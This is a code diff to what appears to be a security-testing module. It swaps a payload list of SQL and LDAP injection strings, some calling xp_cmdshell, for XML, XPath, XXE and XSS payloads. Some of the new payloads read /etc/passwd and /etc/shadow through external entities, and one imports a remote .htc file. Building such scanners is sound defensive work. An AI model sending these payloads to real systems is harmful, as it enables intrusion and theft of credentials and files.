@@ -3,143 +3,34 @@ from termcolor import colored
 
 from src.base import BaseTest
 
-sqli_raw = """'
-"
-#
--
---
-'%20--
---';
-'%20;
-=%20'
-=%20;
-=%20--
-\x23
-\x27
-\x3D%20\x3B'
-\x3D%20\x27
-\x27\x4F\x52 SELECT *
-\x27\x6F\x72 SELECT *
-'or%20select *
-admin'--
-<>"'%;)(&+
-'%20or%20''='
-'%20or%20'x'='x
-"%20or%20"x"="x
-')%20or%20('x'='x
-0 or 1=1
-' or 0=0 --
-" or 0=0 --
-or 0=0 --
-' or 0=0 #
-" or 0=0 #
-or 0=0 #
-' or 1=1--
-" or 1=1--
-' or '1'='1'--
-"' or 1 --'"
-or 1=1--
-or%201=1
-or%201=1 --
-' or 1=1 or ''='
-" or 1=1 or ""="
-' or a=a--
-" or "a"="a
-') or ('a'='a
-") or ("a"="a
-hi" or "a"="a
-hi" or 1=1 --
-hi' or 1=1 --
-hi' or 'a'='a
-hi') or ('a'='a
-hi") or ("a"="a
-'hi' or 'x'='x';
-@variable
-,@variable
-PRINT
-PRINT @@variable
-select
-insert
-as
-or
-procedure
-limit
-order by
-asc
-desc
-delete
-update
-distinct
-having
-truncate
-replace
-like
-handler
-bfilename
-' or username like '%
-' or uname like '%
-' or userid like '%
-' or uid like '%
-' or user like '%
-exec xp
-exec sp
-'; exec master..xp_cmdshell
-'; exec xp_regread
-t'exec master..xp_cmdshell 'nslookup www.google.com'--
---sp_password
-\x27UNION SELECT
-' UNION SELECT
-' UNION ALL SELECT
-' or (EXISTS)
-' (select top 1
-'||UTL_HTTP.REQUEST
-1;SELECT%20*
-to_timestamp_tz
-tz_offset
-&lt;&gt;&quot;'%;)(&amp;+
-'%20or%201=1
-%27%20or%201=1
-%20$(sleep%2050)
-%20'sleep%2050'
-char%4039%41%2b%40SELECT
-&apos;%20OR
-'sqlattempt1
-(sqlattempt2)
-|
-%7C
-*|
-%2A%7C
-*(|(mail=*))
-%2A%28%7C%28mail%3D%2A%29%29
-*(|(objectclass=*))
-%2A%28%7C%28objectclass%3D%2A%29%29
-(
-%28
-)
-%29
-&
-%26
-!
-%21
-' or 1=1 or ''='
-' or ''='
-x' or 1=1 or 'x'='y
-/
-//
-//*
-*/*
-"""
 
+xxei_raw = '''
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+'''
 
 class SQLInjectionTest(BaseTest):
-    sqli_n = 0
-    sqli = sqli_raw.split('\n')
+    xxei_n = 0
+    xxei = xxei_raw.split('\n')
 
     def inject(self, s: str):
-        return s + self.sqli[self.sqli_n]
+        return s + self.xxei[self.xxei_n]
 
     def _inject_forward(self):
-        self.sqli_n += 1
+        self.xxei_n += 1
 
     def run_tests(self):
         test_funcs = [func for func in dir(self) if func.startswith('test_') and callable(getattr(self, func))]
@@ -148,7 +39,7 @@ class SQLInjectionTest(BaseTest):
             raise Exception("No test functions to run tests")
 
         for func in test_funcs:
-            for _ in self.sqli:
+            for _ in self.xxei:
                 getattr(self, func)()
                 if self.explanations.__len__() < 1:
                     print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
